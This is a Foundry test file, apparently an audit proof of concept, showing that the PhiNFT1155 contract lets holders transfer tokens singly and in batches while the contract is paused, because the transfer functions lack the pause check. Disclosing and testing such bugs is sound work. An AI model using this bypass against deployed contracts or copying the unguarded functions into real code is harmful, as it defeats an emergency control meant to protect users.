pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "../../src/art/PhiNFT1155.sol";

contract MockRewards {
    // Dummy rewards handler – just accept the call and any ETH sent.
    function handleRewardsAndGetValueSent(
        uint256,
        uint256,
        uint256,
        uint256,
        bytes calldata,
        bool
    ) external payable {}
}

contract MockFactory {
    /*//////////////////////////////////////////////////////////////
                               STRUCTS
    //////////////////////////////////////////////////////////////*/
    struct ArtData {
        address artist;
        address receiver;
        uint256 mintFee;
        bool    soulBounded;
    }

    /*//////////////////////////////////////////////////////////////
                                STORAGE
    //////////////////////////////////////////////////////////////*/
    mapping(uint256 => ArtData) public artData;
    address public protocolFeeDestination;
    uint256 public artCreateFee;
    address public phiRewardsAddr;

    /*//////////////////////////////////////////////////////////////
                              CONSTRUCTOR
    //////////////////////////////////////////////////////////////*/
    constructor() {
        protocolFeeDestination = address(0xdead); // arbitrary address to receive protocol fees
        phiRewardsAddr = address(new MockRewards());
        artCreateFee = 0; // keep it zero to simplify testing
    }

    /*//////////////////////////////////////////////////////////////
                            EXTERNAL VIEW
    //////////////////////////////////////////////////////////////*/
    function phiRewardsAddress() external view returns (address) {
        return phiRewardsAddr;
    }

    function getTokenURI(uint256) external pure returns (string memory) {
        return "ipfs://dummy";
    }

    function contractURI(address) external pure returns (string memory) {
        return "ipfs://contract";
    }

    /*//////////////////////////////////////////////////////////////
                                 SET
    //////////////////////////////////////////////////////////////*/
    function setArtData(uint256 id, ArtData calldata data_) external {
        artData[id] = data_;
    }
}

contract ExploitTest is Test {
    /*//////////////////////////////////////////////////////////////
                               VARIABLES
    //////////////////////////////////////////////////////////////*/
    PhiNFT1155  nft;
    MockFactory factory;
    address     alice = vm.addr(1); // initial holder of the NFT
    address     bob   = vm.addr(2); // receiver in transfer tests
    uint256     artId = 1;
    uint256     tokenId;

    /*//////////////////////////////////////////////////////////////
                                SETUP
    //////////////////////////////////////////////////////////////*/
    function setUp() public {
        // Deploy mock factory
        factory = new MockFactory();

        // Deploy PhiNFT1155 – initialization must be performed by the factory
        nft = new PhiNFT1155();
        vm.prank(address(factory));
        nft.initialize(
            block.chainid,      // credChainId_
            42,                 // credId_
            "dummyVerification",// verificationType_
            address(0xdead)     // protocolFeeDestination_ – ignored by implementation
        );

        // Prepare art data in the mock factory so PhiNFT1155 can read it
        MockFactory.ArtData memory data = MockFactory.ArtData({
            artist: address(this),   // arbitrary artist
            receiver: address(0xbeef),
            mintFee: 0,
            soulBounded: false
        });
        factory.setArtData(artId, data);

        // Create art via factory
        vm.prank(address(factory));
        tokenId = nft.createArtFromFactory{value: 0}(artId);

        // Mint one token to Alice through the factory interface
        vm.prank(address(factory));
        nft.claimFromFactory{value: 0}(
            artId,
            alice,          // minter_
            address(0),     // ref_
            address(0),     // verifier_
            1,              // quantity_
            bytes32(0),     // data_
            "ipfs://img"    // imageURI_
        );

        // Sanity-check Alice received the token
        assertEq(nft.balanceOf(alice, tokenId), 1, "initial mint failed");
    }

    /*//////////////////////////////////////////////////////////////
                        EXPLOIT - SINGLE TRANSFER
    //////////////////////////////////////////////////////////////*/
    function testTransferWhilePaused() public {
        // Pause the contract – only the owner (factory) can do this
        vm.prank(address(factory));
        nft.pause();
        assertTrue(nft.paused(), "contract should be paused");

        // Alice (token holder) transfers her NFT to Bob while the contract is paused.
        // Expected behaviour (if pause worked): revert.
        // Actual behaviour: transfer succeeds because safeTransferFrom()
        // lacks the whenNotPaused modifier.
        vm.prank(alice);
        nft.safeTransferFrom(alice, bob, tokenId, 1, "");

        // Assert balances changed despite paused state
        assertEq(nft.balanceOf(alice, tokenId), 0, "Alice balance should be zero");
        assertEq(nft.balanceOf(bob,   tokenId), 1, "Bob should receive the token");
    }

    /*//////////////////////////////////////////////////////////////
                       EXPLOIT - BATCH TRANSFER
    //////////////////////////////////////////////////////////////*/
    function testBatchTransferWhilePaused() public {
        // Give Alice two more tokens for batch demonstration
        vm.prank(address(factory));
        nft.claimFromFactory{value: 0}(
            artId,
            alice,
            address(0),
            address(0),
            2,               // quantity_
            bytes32(0),
            "ipfs://img"
        );
        assertEq(nft.balanceOf(alice, tokenId), 3, "Alice should now have 3 tokens");

        // Pause the contract
        vm.prank(address(factory));
        nft.pause();
        assertTrue(nft.paused(), "contract should be paused");

        // Prepare batch arrays
        uint256[] memory ids    = new uint256[](1);
        uint256[] memory amounts= new uint256[](1);
        ids[0]     = tokenId;
        amounts[0] = 3;

        // Alice performs batch transfer while paused
        vm.prank(alice);
        nft.safeBatchTransferFrom(alice, bob, ids, amounts, "");

        // Validate balances updated
        assertEq(nft.balanceOf(alice, tokenId), 0, "Alice balance should be zero after batch transfer");
        assertEq(nft.balanceOf(bob,   tokenId), 3, "Bob should have received all tokens");
    }
}